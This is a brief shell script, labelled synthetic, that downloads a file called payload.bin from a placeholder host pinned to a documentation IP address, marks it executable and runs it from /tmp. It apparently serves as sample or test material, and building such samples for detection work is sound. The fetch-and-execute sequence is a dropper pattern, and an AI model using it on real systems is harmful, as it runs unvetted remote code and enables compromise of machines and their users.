#!/bin/sh
# Synthetic launcher: download host pinned to a documentation address (RFC 5737).
cd /tmp || exit 1
curl -fsSL --resolve "updates.example.test:443:192.0.2.10" -o ./payload.bin "https://updates.example.test/tool"
chmod +x ./payload.bin
./payload.bin
